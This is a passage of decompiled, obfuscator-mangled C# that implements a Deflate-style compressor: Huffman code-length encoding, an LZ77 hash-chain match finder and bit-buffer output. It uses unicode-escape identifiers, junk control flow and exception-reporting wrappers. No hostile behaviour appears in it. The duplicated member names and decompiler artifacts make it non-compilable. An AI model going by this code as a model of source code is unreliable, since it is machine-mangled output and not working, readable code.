                    numArray1[index9] = numArray1[index8];
                  }
                }
                num11 = num14;
                num10 = num13;
              }
            }
            else
            {
              num1 = (int) this.\u0001[index3];
              if (num1 != 0)
              {
                index1 = num2++;
                goto label_5;
              }
              else
                goto label_8;
            }
          }
          catch (Exception ex)
          {
            object[] objArray = new object[23]
            {
              (object) length1,
              (object) numArray1,
              (object) num2,
              (object) num3,
              (object) index3,
              (object) num1,
              (object) index1,
              (object) index2,
              (object) num4,
              (object) num5,
              (object) numArray2,
              (object) numArray3,
              (object) num6,
              (object) index4,
              (object) index5,
              (object) index6,
              (object) index7,
              (object) index8,
              (object) index9,
              (object) num7,
              (object) index10,
              (object) num8,
              (object) this
            };
            \u0003.\u0001(ex, objArray);
            throw;
          }
        }

        public int \u0001()
        {
          int index;
          int num1;
          try
          {
            int num2;
            if (true)
            {
              int num3 = 0;
              if (num3 != 0)
              {
                num2 = num3;
                goto label_6;
              }
              else
              {
                num1 = num3;
                int num4 = 0;
                if (num4 == 0)
                  goto label_8;
label_2:
                if (true)
                {
                  num1 = num4 + (int) this.\u0001[index] * (int) this.\u0001[index];
                  if (true)
                    index++;
                  else
                    goto label_5;
                }
                else
                  goto label_4;
label_3:
                num4 = index;
label_4:
                if (num4 < this.\u0001.Length)
                {
                  num4 = num1;
                  goto label_2;
                }
                else
                  goto label_5;
label_8:
                index = num4;
                goto label_3;
              }
            }
label_5:
            num2 = num1;
label_6:
            return num2;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) index;
            \u0003.\u0001(ex, (object) local1, (object) local2, (object) this);
            throw;
          }
        }

        public void \u0001([In] \u0003.\u0007.\u0001 obj0)
        {
          int num1;
          int num2;
          int num3;
          int num4;
          short[] numArray1;
          IntPtr index1;
          int num5;
          int index2;
          try
          {
            if (true)
              goto label_18;
label_1:
            index2 = 0;
            while (index2 < this.\u0002)
            {
              num5 = 1;
              num4 = (int) this.\u0001[index2];
              if (num4 == 0)
              {
                num1 = 138;
                if (true)
                  num2 = 3;
              }
              else
              {
                num1 = 6;
                num2 = 3;
                if (num3 != num4)
                {
                  (numArray1 = obj0.\u0001)[(int) (index1 = (IntPtr) num4)] = (short) ((int) numArray1[index1] + 1);
                  num5 = 0;
                }
              }
              num3 = num4;
              ++index2;
              while (index2 < this.\u0002 && num3 == (int) this.\u0001[index2])
              {
                ++index2;
                if (++num5 >= num1)
                  break;
              }
              if (num5 < num2)
                (numArray1 = obj0.\u0001)[(int) (index1 = (IntPtr) num3)] = (short) ((int) numArray1[index1] + (int) (short) num5);
              else if (num3 != 0)
                (numArray1 = obj0.\u0001)[16] = (short) ((int) numArray1[16] + 1);
              else if (num5 <= 10)
                (numArray1 = obj0.\u0001)[17] = (short) ((int) numArray1[17] + 1);
              else
                (numArray1 = obj0.\u0001)[18] = (short) ((int) numArray1[18] + 1);
            }
            return;
label_18:
            num3 = -1;
            goto label_1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) num5;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> local5 = (ValueType) index2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local6 = (ValueType) num4;
            short[] numArray2 = numArray1;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> local7 = (ValueType) index1;
            \u0003.\u0007.\u0001 obj = obj0;
            \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) numArray2, (object) local7, (object) this, (object) obj);
            throw;
          }
        }

        public void \u0002([In] \u0003.\u0007.\u0001 obj0)
        {
          int num1;
          int num2;
          int num3;
          int num4;
          int num5;
          int index;
          try
          {
            num3 = -1;
            index = 0;
            if (false)
              goto label_5;
            else
              goto label_25;
label_4:
            num2 = 3;
            if (num3 == num4)
              goto label_7;
label_5:
            obj0.\u0001(num4);
            if (false)
              return;
            num5 = 0;
label_7:
            num3 = num4;
            ++index;
            while (index < this.\u0002)
            {
              if (true)
              {
                if (num3 == (int) this.\u0001[index])
                {
                  ++index;
                  if (++num5 >= num1)
                    break;
                }
                else
                  break;
              }
              else
                goto label_4;
            }
            if (num5 >= num2)
              goto label_15;
label_14:
            while (num5-- > 0)
              obj0.\u0001(num3);
            goto label_25;
label_15:
            int num6;
            int num7;
            if (num3 != 0)
            {
              obj0.\u0001(16);
              if (true)
                this.\u0001.\u0001.\u0001(num5 - 3, 2);
              else
                goto label_14;
            }
            else
            {
              num6 = num5;
              num7 = 10;
              goto label_21;
            }
label_18:
            if (false)
              goto label_28;
            else
              goto label_25;
label_21:
            if (num6 <= num7)
            {
              if (true)
              {
                obj0.\u0001(17);
                this.\u0001.\u0001.\u0001(num5 - 3, 3);
              }
              else
                goto label_18;
            }
            else
            {
              obj0.\u0001(18);
              this.\u0001.\u0001.\u0001(num5 - 11, 7);
            }
label_25:
            int num8 = index;
            int num9 = this.\u0002;
            if (false)
            {
              num7 = num9;
              num6 = num8;
              goto label_21;
            }
            else
            {
              if (num8 >= num9)
                return;
              num5 = 1;
            }
label_28:
            int num10 = (int) this.\u0001[index];
            if (true)
              num4 = num10;
            if (num4 == 0)
            {
              num1 = 138;
              num2 = 3;
              goto label_7;
            }
            else
            {
              num1 = 6;
              goto label_4;
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) num5;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> local5 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> local6 = (ValueType) num4;
            \u0003.\u0007.\u0001 obj = obj0;
            \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this, (object) obj);
            throw;
          }
        }
      }
    }

    internal sealed class \u0008
    {
      private int \u0001;
      private short[] \u0001;
      private short[] \u0002;
      private int \u0002;
      private int \u0003;
      private bool \u0001;
      private int \u0004;
      private int \u0005;
      private int \u0006;
      private byte[] \u0001;
      private byte[] \u0002;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private \u0003.\u000E \u0001;
      private \u0003.\u0007 \u0001;

      public \u0008([In] \u0003.\u000E obj0)
      {
        int num;
        try
        {
          this.\u0001 = obj0;
          this.\u0001 = new \u0003.\u0007(obj0);
          this.\u0001 = new byte[65536];
          this.\u0001 = new short[32768];
          this.\u0002 = new short[32768];
          this.\u0005 = num = 1;
          this.\u0004 = num;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num;
          \u0003.\u000E obj = obj0;
          \u0003.\u0001(ex, (object) local, (object) this, (object) obj);
          throw;
        }
      }

      private void \u0001()
      {
        try
        {
          this.\u0001 = (int) this.\u0001[this.\u0005] << 5 ^ (int) this.\u0001[this.\u0005 + 1];
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
      }

      private int \u0001()
      {
        int index1;
        short num1;
        try
        {
          do
          {
            int num2 = this.\u0001;
            int num3 = 5;
            int num4;
            int num5;
            if (num3 != 0)
            {
              if (num3 != 0)
              {
                int num6 = num2 << num3;
                num3 = (int) this.\u0001[this.\u0005 + 2];
                num2 = num6;
              }
              else
              {
                num5 = num3;
                num4 = num2;
                goto label_4;
              }
            }
            num4 = num2 ^ num3;
            num5 = (int) short.MaxValue;
label_4:
            index1 = num4 & num5;
            short[] numArray = this.\u0002;
            int index2 = this.\u0005 & (int) short.MaxValue;
            int num7 = (int) this.\u0001[index1];
            if (true)
              goto label_7;
label_5:
            numArray[index2] = (short) num7;
            this.\u0001[index1] = (short) this.\u0005;
            continue;
label_7:
            num1 = (short) num7;
            goto label_5;
          }
          while (false);
          this.\u0001 = index1;
          return (int) num1 & (int) ushort.MaxValue;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<short> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) index1;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) this);
          throw;
        }
      }

      private void \u0002()
      {
        int num1;
        int index1;
        int index2;
        int num2;
        try
        {
          Array.Copy((Array) this.\u0001, 32768, (Array) this.\u0001, 0, 32768);
          do
          {
            this.\u0002 -= 32768;
            this.\u0005 -= 32768;
            this.\u0004 -= 32768;
          }
          while (false);
          for (index1 = 0; index1 < 32768; ++index1)
          {
            num1 = (int) this.\u0001[index1] & (int) ushort.MaxValue;
            this.\u0001[index1] = num1 >= 32768 ? (short) (num1 - 32768) : (short) 0;
          }
          index2 = 0;
          while (true)
          {
            int num3 = index2;
            int num4 = 32768;
            if (num4 != 0)
              goto label_8;
label_6:
            index2 = num3 + num4;
            continue;
label_8:
            if (num3 < num4)
            {
              num2 = (int) this.\u0002[index2] & (int) ushort.MaxValue;
              this.\u0002[index2] = num2 >= 32768 ? (short) (num2 - 32768) : (short) 0;
              int num5 = index2;
              num4 = 1;
              num3 = num5;
              goto label_6;
            }
            else
              break;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) index2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num2;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) this);
          throw;
        }
      }

      public void \u0003()
      {
        int length;
        try
        {
          int num1 = this.\u0005;
          int num2 = 65274;
          if (num2 != 0)
          {
            if (num1 >= num2)
            {
              this.\u0002();
              if (false)
                return;
              goto label_7;
            }
            else
              goto label_7;
          }
label_5:
          length = num1 - num2;
label_6:
          Array.Copy((Array) this.\u0002, this.\u0008, (Array) this.\u0001, this.\u0005 + this.\u0006, length);
          this.\u0008 += length;
          this.\u0007 += length;
          this.\u0006 += length;
label_7:
          while (this.\u0006 >= 262 || this.\u0008 >= this.\u000E)
          {
            if (true)
            {
              if (this.\u0006 < 3)
                return;
              this.\u0001();
              return;
            }
          }
          length = 65536 - this.\u0006 - this.\u0005;
          if (length > this.\u000E - this.\u0008)
          {
            int num3 = this.\u000E;
            num2 = this.\u0008;
            num1 = num3;
            goto label_5;
          }
          else
            goto label_6;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) length;
          \u0003.\u0001(ex, (object) local, (object) this);
          throw;
        }
      }

      private bool \u0001([In] int obj0)
      {
        int val1;
        int num1;
        int num2;
        int index1;
        byte num3;
        byte num4;
        int num5;
        int num6;
        int index2;
        int num7;
        short[] numArray;
        try
        {
          num5 = 128;
          num6 = 128;
          numArray = this.\u0002;
          index2 = this.\u0005;
          index1 = this.\u0005 + this.\u0003;
          val1 = Math.Max(this.\u0003, 2);
          num1 = Math.Max(this.\u0005 - 32506, 0);
          int num8 = this.\u0005;
          int num9 = 258;
          if (num9 != 0)
          {
            num2 = num8 + num9 - 1;
            num3 = this.\u0001[index1 - 1];
            num4 = this.\u0001[index1];
            if (val1 >= 8)
              num5 >>= 2;
            if (num6 > this.\u0006)
              num6 = this.\u0006;
          }
          else
            goto label_14;
label_5:
          if ((int) this.\u0001[obj0 + val1] == (int) num4 && (int) this.\u0001[obj0 + val1 - 1] == (int) num3 && (int) this.\u0001[obj0] == (int) this.\u0001[index2] && (int) this.\u0001[obj0 + 1] == (int) this.\u0001[index2 + 1])
          {
            num7 = obj0 + 2;
            index2 += 2;
            do
              ;
            while ((int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && index2 < num2);
            if (index2 > index1)
            {
              this.\u0002 = obj0;
              index1 = index2;
              val1 = index2 - this.\u0005;
              if (val1 < num6)
              {
                num3 = this.\u0001[index1 - 1];
                num4 = this.\u0001[index1];
              }
              else
                goto label_15;
            }
            index2 = this.\u0005;
          }
          if ((obj0 = (int) numArray[obj0 & (int) short.MaxValue] & (int) ushort.MaxValue) > num1)
          {
            int num10 = num5;
            num9 = 1;
            num8 = num10;
          }
          else
            goto label_15;
label_14:
          if ((num5 = num8 - num9) != 0)
            goto label_5;
label_15:
          this.\u0003 = Math.Min(val1, this.\u0006);
          return this.\u0003 >= 3;
        }
        catch (Exception ex)
        {
          object[] objArray = new object[13]
          {
            (object) num5,
            (object) num6,
            (object) numArray,
            (object) index2,
            (object) num7,
            (object) index1,
            (object) val1,
            (object) num1,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) this,
            (object) obj0
          };
          \u0003.\u0001(ex, objArray);
          throw;
        }
      }

      private bool \u0001([In] bool obj0, [In] bool obj1)
      {
        int num1;
        int num2;
        int num3;
        int num4;
        bool flag;
        try
        {
          if (this.\u0006 < 262 && !obj0)
            return false;
label_35:
          if (this.\u0006 < 262 && !obj0)
            return true;
label_2:
          int num5;
          for (int index = this.\u0006; index != 0; index = num5)
          {
            int num6 = this.\u0005;
            int num7;
            while (true)
            {
              if (num6 >= 65274)
                this.\u0002();
              num1 = this.\u0002;
              num2 = this.\u0003;
              int num8 = this.\u0006;
              int num9 = 3;
              int num10;
              int num11;
              while (true)
              {
                if (num8 >= num9)
                {
                  num3 = this.\u0001();
                  while (num3 != 0 && this.\u0005 - num3 <= 32506 && this.\u0001(num3) && this.\u0003 <= 5 && this.\u0003 == 3 && this.\u0005 - this.\u0002 > 4096)
                  {
                    if (true)
                    {
                      this.\u0003 = 2;
                      break;
                    }
                  }
                }
                num5 = num2;
                if (true)
                {
                  int num12;
                  if (num5 >= 3)
                    num12 = this.\u0003;
                  else
                    goto label_23;
label_16:
                  int num13 = num2;
                  if (num12 <= num13)
                  {
                    this.\u0001.\u0001(this.\u0005 - 1 - num1, num2);
                    int num14 = num2;
                    int num15 = 2;
                    if (num15 == 0)
                    {
                      num9 = num15;
                      num8 = num14;
                      continue;
                    }
                    num2 = num14 - num15;
                    do
                    {
                      ++this.\u0005;
                      --this.\u0006;
                      if (this.\u0006 >= 3)
                        this.\u0001();
                    }
                    while (--num2 > 0);
                    ++this.\u0005;
                    --this.\u0006;
                    this.\u0001 = false;
                    this.\u0003 = 2;
                    goto label_26;
                  }
label_23:
                  if (this.\u0001)
                    this.\u0001.\u0001((int) this.\u0001[this.\u0005 - 1] & (int) byte.MaxValue);
                  this.\u0001 = true;
                  ++this.\u0005;
                  --this.\u0006;
label_26:
                  if (this.\u0001.\u0001())
                  {
                    num4 = this.\u0005 - this.\u0004;
                    if (this.\u0001)
                    {
                      num12 = num4;
                      if (true)
                      {
                        num11 = 1;
                        num10 = num12;
                      }
                      else
                        goto label_16;
                    }
                    else
                      goto label_31;
label_30:
                    num4 = num10 - num11;
label_31:
                    flag = obj1 && this.\u0006 == 0 && !this.\u0001;
                    this.\u0001.\u0002(this.\u0001, this.\u0004, num4, flag);
                    this.\u0004 += num4;
                    if (true)
                    {
                      num10 = flag ? 1 : 0;
                      num11 = 0;
                      if (num11 != 0)
                        goto label_30;
                      else
                        break;
                    }
                    else
                      goto label_23;
                  }
                  else
                    goto label_35;
                }
                else
                  goto label_2;
              }
              num7 = num10 == num11 ? 1 : 0;
              if (false)
                num6 = num7;
              else
                break;
            }
            return num7 != 0;
          }
          if (this.\u0001)
            goto label_39;
label_3:
          this.\u0001 = false;
          this.\u0001.\u0002(this.\u0001, this.\u0004, this.\u0005 - this.\u0004, obj1);
          this.\u0004 = this.\u0005;
          return false;
label_39:
          this.\u0001.\u0001((int) this.\u0001[this.\u0005 - 1] & (int) byte.MaxValue);
          goto label_3;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local5 = (ValueType) flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local6 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local7 = (ValueType) obj1;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) this, (object) local6, (object) local7);
          throw;
        }
      }

      public bool \u0002([In] bool obj0, [In] bool obj1)
      {
        bool flag1;
        bool flag2;
        bool flag3;
        try
        {
          do
          {
            this.\u0003();
            int num1 = obj0 ? 1 : 0;
            if (true)
            {
              if (num1 == 0)
              {
                if (true)
                  num1 = 0;
                else
                  goto label_11;
              }
              else
                num1 = this.\u0008 == this.\u000E ? 1 : 0;
            }
label_10:
            flag3 = num1 != 0;
label_11:
            int num2 = this.\u0001(flag3, obj1) ? 1 : 0;
            if (true)
            {
              flag1 = num2 != 0;
              if (!this.\u0001.\u0001() || !flag1)
                num2 = flag1 ? 1 : 0;
              else
                continue;
            }
            if (true)
            {
              flag2 = num2 != 0;
            }
            else
            {
              num1 = num2;
              goto label_10;
            }
          }
          while (false);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> local1 = (ValueType) flag1;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local2 = (ValueType) flag3;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local3 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local4 = (ValueType) obj1;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) this, (object) local3, (object) local4);
          throw;
        }
        return flag2;
      }

      public void \u0001([In] byte[] obj0)
      {
        try
        {
          do
          {
            this.\u0002 = obj0;
            this.\u0008 = 0;
            this.\u000E = obj0.Length;
          }
          while (false);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0003.\u0001(ex, (object) this, (object) numArray);
          throw;
        }
      }

      public bool \u0001()
      {
        bool flag;
        try
        {
          flag = this.\u000E == this.\u0008;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return flag;
      }
    }

    internal sealed class \u000E
    {
      protected byte[] \u0001 = new byte[65536];
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public void \u0001([In] int obj0)
      {
        int num1;
        try
        {
          byte[] numArray1 = this.\u0001;
          \u0003.\u000E obj1 = this;
          int num2;
          num1 = num2 = obj1.\u0002;
          obj1.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) obj0;
          numArray1[index1] = (byte) num3;
          byte[] numArray2 = this.\u0001;
          \u0003.\u000E obj2 = this;
          int num4;
          num1 = num4 = obj2.\u0002;
          obj2.\u0002 = num4 + 1;
          int index2 = num1;
          int num5 = (int) (byte) (obj0 >> 8);
          numArray2[index2] = (byte) num5;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        try
        {
          byte[] sourceArray = obj0;
          int sourceIndex = obj1;
          byte[] destinationArray = this.\u0001;
          int destinationIndex = this.\u0002;
          int length = obj2;
          if (true)
            goto label_2;
label_1:
          this.\u0002 += obj2;
          return;
label_2:
          Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
          goto label_1;
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj2;
          \u0003.\u0001(ex, (object) this, (object) numArray, (object) local1, (object) local2);
          throw;
        }
      }

      [SpecialName]
      public int \u0001()
      {
        int num;
        try
        {
          num = this.\u0003;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num;
      }

      public void \u0001()
      {
        int num1;
        try
        {
          int num2 = this.\u0003;
label_1:
          if (true)
          {
            if (num2 > 0)
            {
              byte[] numArray = this.\u0001;
              \u0003.\u000E obj = this;
              int num3;
              num1 = num3 = obj.\u0002;
              obj.\u0002 = num3 + 1;
              int index = num1;
              int num4 = (int) (byte) this.\u0001;
              numArray[index] = (byte) num4;
              goto label_9;
            }
            else
              goto label_5;
          }
label_3:
          if (true)
          {
            if (num2 > 8)
              goto label_10;
          }
          else
            goto label_1;
label_5:
          this.\u0001 = 0U;
          if (true)
          {
            this.\u0003 = 0;
            if (true)
              return;
            goto label_10;
          }
label_9:
          num2 = this.\u0003;
          goto label_3;
label_10:
          byte[] numArray1 = this.\u0001;
          \u0003.\u000E obj1 = this;
          int num5;
          num1 = num5 = obj1.\u0002;
          obj1.\u0002 = num5 + 1;
          int index1 = num1;
          int num6 = (int) (byte) (this.\u0001 >> 8);
          numArray1[index1] = (byte) num6;
          goto label_5;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num1;
          \u0003.\u0001(ex, (object) local, (object) this);
          throw;
        }
      }

      public void \u0001([In] int obj0, [In] int obj1)
      {
        int num1;
        try
        {
          this.\u0001 |= (uint) (obj0 << this.\u0003);
          this.\u0003 += obj1;
          if (this.\u0003 < 16)
            return;
          do
          {
            if (true)
              goto label_5;
label_2:
            continue;
label_5:
            byte[] numArray1 = this.\u0001;
            \u0003.\u000E obj = this;
            int num2;
            num1 = num2 = obj.\u0002;
            obj.\u0002 = num2 + 1;
            int index1 = num1;
            int num3 = (int) (byte) this.\u0001;
            numArray1[index1] = (byte) num3;
            byte[] numArray2 = this.\u0001;
            num1 = this.\u0002++;
            int index2 = num1;
            int num4 = (int) (byte) (this.\u0001 >> 8);
            numArray2[index2] = (byte) num4;
            this.\u0001 >>= 16;
            goto label_2;
          }
          while (false);
          this.\u0003 -= 16;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2, (object) local3);
          throw;
        }
      }

      [SpecialName]
      public bool \u0001()
      {
        bool flag;
        try
        {
          do
          {
            flag = this.\u0002 == 0;
          }
          while (false);
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return flag;
      }

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
          if (this.\u0003 >= 8)
          {
            byte[] numArray = this.\u0001;
            \u0003.\u000E obj = this;
            int num2;
            num1 = num2 = obj.\u0002;
            obj.\u0002 = num2 + 1;
            int index = num1;
            int num3 = (int) (byte) this.\u0001;
            numArray[index] = (byte) num3;
            this.\u0001 >>= 8;
            this.\u0003 -= 8;
          }
          if (obj2 <= this.\u0002 - this.\u0001)
          {
            Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
            this.\u0001 += obj2;
          }
          else
            goto label_5;
label_2:
          return obj2;
label_5:
          obj2 = this.\u0002 - this.\u0001;
          Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
          this.\u0001 = 0;
          this.\u0002 = 0;
          goto label_2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj2;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) numArray, (object) local2, (object) local3);
          throw;
        }
      }
    }

    internal sealed class \u000F : MemoryStream
    {
      public void \u0001([In] int obj0)
      {
        try
        {
          do
          {
            if (true)
              goto label_4;
label_1:
            if (true)
              continue;
            goto label_5;
label_4:
            this.WriteByte((byte) (obj0 & (int) byte.MaxValue));
label_5:
            this.WriteByte((byte) (obj0 >> 8 & (int) byte.MaxValue));
            goto label_1;
          }
          while (false);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0003.\u0001(ex, (object) this, (object) local);
          throw;
        }
      }

      public void \u0002([In] int obj0)
      {
        try
        {
          do
          {
            this.\u0001(obj0);
            this.\u0001(obj0 >> 16);
          }
          while (false);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0003.\u0001(ex, (object) this, (object) local);
          throw;
        }
      }

      public int \u0001()
      {
        int num1;
        try
        {
          if (true)
          {
            int num2 = this.ReadByte();
            int num3;
            while (true)
            {
              int num4 = this.ReadByte();
              int num5;
              while (true)
              {
                num5 = num4 << 8;
                if (false)
                  num4 = num5;
                else
                  break;
              }
              num3 = num2 | num5;
              if (false)
                num2 = num3;
              else
                break;
            }
            num1 = num3;
          }
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num1;
      }

      public int \u0002()
      {
        int num1;
        try
        {
          if (true)
          {
            int num2 = this.\u0001();
            int num3;
            while (true)
            {
              int num4 = this.\u0001();
              int num5;
              while (true)
              {
                num5 = num4 << 16;
                if (false)
                  num4 = num5;
                else
                  break;
              }
              num3 = num2 | num5;
              if (false)
                num2 = num3;
              else
                break;
            }
            num1 = num3;
          }
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num1;
      }

      public \u000F()
      {
      }

      public \u000F([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
